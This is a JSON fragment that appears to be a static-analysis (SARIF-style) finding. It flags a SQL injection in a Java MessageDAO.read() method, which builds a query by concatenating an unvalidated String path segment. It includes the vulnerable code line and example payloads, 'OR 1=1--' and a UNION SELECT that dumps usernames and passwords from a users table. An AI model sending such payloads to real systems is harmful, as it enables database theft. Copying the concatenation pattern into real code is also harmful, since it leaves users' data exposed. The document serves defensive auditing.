          "ruleId": "sql-injection",
          "level": "error",
          "message": {
            "text": "The read() handler takes the {id} URL path segment as a raw String and passes it unchanged to messageDao.read(id). Inside MessageDAO.read(), this value is concatenated directly into a SQL query:\n\n// MessageDAO.java (line 41-42)\njdbcTemplate.query(\"SELECT id, author, subject, body, timestamp \" +\n        \"FROM messages WHERE id = \" + id, ...)\n\nBecause id is typed as String (not an int/long) in the controller, the full, unvalidated URL path segment reaches the SQL string. A request such as:\n\nGET /messages/read/1 OR 1=1--\nGET /messages/read/1 UNION SELECT null,username,password,null,null FROM users--\n\nallows an unauthenticated-or-authenticated attacker to dump arbitrary database tables, including the users table that stores credentials.",
            "markdown": "The `read()` handler takes the `{id}` URL path segment as a raw `String` and passes it unchanged to `messageDao.read(id)`. Inside `MessageDAO.read()`, this value is concatenated directly into a SQL query:\n\n```java\n// MessageDAO.java (line 41-42)\njdbcTemplate.query(\"SELECT id, author, subject, body, timestamp \" +\n        \"FROM messages WHERE id = \" + id, ...)\n```\n\nBecause `id` is typed as `String` (not an `int`/`long`) in the controller, the full, unvalidated URL path segment reaches the SQL string. A request such as:\n\n```\nGET /messages/read/1 OR 1=1--\nGET /messages/read/1 UNION SELECT null,username,password,null,null FROM users--\n```\n\nallows an unauthenticated-or-authenticated attacker to dump arbitrary database tables, including the `users` table that stores credentials."
